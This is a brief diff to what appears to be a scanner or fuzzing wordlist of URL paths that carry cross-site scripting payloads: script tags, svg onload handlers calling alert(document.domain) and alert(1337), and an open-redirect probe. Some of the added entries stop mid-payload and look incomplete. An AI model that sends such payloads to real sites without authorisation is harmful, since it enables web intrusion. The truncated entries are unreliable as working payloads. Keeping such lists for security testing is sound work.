@@ -5,3 +5,7 @@
 /fmlurlsvc/?=&url=https%3A%2F%2Fgoogle.com<Svg%2Fonload%3Dalert(document.domain)>
 /login?redir=http://www.example.com
 /message?title=x&msg=%26%23%3Csvg/onload=alert(1337)%3E
+/remote/login?&err=--%3E%3Cscript%3Ealert(
+/p/user/ftoken/activate/user/guest/?action=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cscript%3E
+/error3?msg=30&data=
+/omni_success?cmdb_edit_path=\
